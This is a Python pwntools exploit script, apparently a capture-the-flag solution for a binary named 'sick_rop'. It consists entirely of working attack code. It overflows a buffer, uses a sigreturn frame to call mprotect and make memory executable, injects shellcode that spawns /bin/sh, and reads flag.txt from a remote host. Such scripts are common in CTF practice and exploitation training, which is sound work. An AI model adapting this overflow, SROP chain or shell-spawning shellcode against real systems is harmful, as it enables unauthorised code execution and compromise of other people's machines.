#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

vuln = 0x40102e
vuln_ptr = 0x04010d8
syscall = 0x401014

def exploit(io):
    frame = SigreturnFrame()
    frame.rax = 0xa
    frame.rdi = 0x400000
    frame.rsi = 0x4000
    frame.rdx = 0x7
    frame.rsp = vuln_ptr
    frame.rip = syscall

    payload = b"A"*40 + p64(vuln) + p64(syscall) + bytes(frame)

    io.send(payload)
    io.recv()
    io.send(b'A'*15)
    io.recv()

    shellcode = asm("""
                    xor rsi, rsi
                    push rsi
                    movabs rdi, 0x68732f2f6e69622f
                    push rdi
                    mov rdi, rsp
                    mov rax, 59
                    xor rdx, rdx
                    syscall
    """)
    
    payload = shellcode.ljust(40, b"A")
    payload += p64(0x4010b8) 

    io.send(payload)
    io.sendline(b"cat flag.txt")
    io.recv()
    print(io.recv().decode())

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./sick_rop")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)

if __name__ == "__main__":
    main()
